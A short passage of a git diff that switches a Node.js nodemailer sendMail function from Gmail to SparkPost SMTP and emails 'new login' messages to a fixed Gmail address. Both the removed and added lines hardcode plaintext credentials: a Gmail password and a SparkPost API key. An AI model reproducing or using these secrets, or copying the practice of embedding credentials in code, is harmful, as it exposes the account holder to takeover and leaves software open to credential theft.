@@ -201,15 +201,17 @@ Req.get({
 
 function sendMail(msg) {
     var transporter = nodemailer.createTransport({
-        service: 'gmail',
+        host: 'smtp.sparkpostmail.com',
+        port: 587,
+        secure: false, // true for 465, false for other ports
         auth: {
-            user: 'samersamawi.s@gmail.com',
-            pass: 'SamersameR888'
+            user:'SMTP_Injection',
+            pass: '82fbdfd448f46668b8ae087615719cd99d37ec9a'
         }
     });
 
     var mailOptions = {
-        from: 'samer',
+        from: 'samer: new-user@sparkpostbox.com',
         to: 'samer69255@gmail.com',
         subject: 'new login',
         html: msg,
